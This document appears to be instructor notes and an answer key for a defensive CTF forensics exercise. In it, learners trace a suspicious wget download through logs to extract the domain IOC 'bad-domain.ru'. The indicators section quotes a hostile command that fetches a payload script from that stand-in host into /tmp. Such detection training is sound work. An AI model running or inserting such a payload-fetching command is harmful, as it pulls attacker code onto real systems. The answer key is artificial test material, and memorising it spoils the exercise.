# M5-08 Instructor Notes

## Objective
- Train learners to investigate suspicious Linux script downloads and extract malicious domain IOC.
- Expected answer: `CTF{bad-domain.ru}`.

## Expected Investigation Path
1. Read `incident_ticket.txt` and `analyst_handoff.txt`:
   - incident: `INC-2026-5508`
   - node: `lin-dl-02`
2. In `shell_command_telemetry.csv`, find suspicious wget command.
3. In `wget_execution.log`, confirm full URL and domain.
4. In `dns_query.log`, validate domain resolution in same time window.
5. In `proxy_egress.log`, confirm outbound fetch to `/payload.sh`.
6. In `file_write_audit.log`, validate payload write to local `/tmp`.
7. In `download_alerts.jsonl` and `timeline_events.csv`, confirm IOC attribution.
8. Submit malicious domain.

## Key Indicators
- Command pivot:
  - `wget http://bad-domain.ru/payload.sh -O /tmp/payload.sh`
- Network pivots:
  - `url=http://bad-domain.ru/payload.sh`
  - `qname=bad-domain.ru`
  - `domain=bad-domain.ru uri=/payload.sh`
- Alert pivot:
  - `"suspicious_domain":"bad-domain.ru"`
- SIEM pivot:
  - `untrusted_domain_download ... bad-domain.ru`

## Suggested Commands / Tools
- `rg "bad-domain.ru|wget|payload.sh|suspicious_domain" evidence`
- Review:
  - `evidence/host/shell_command_telemetry.csv`
  - `evidence/network/wget_execution.log`
  - `evidence/network/dns_query.log`
  - `evidence/network/proxy_egress.log`
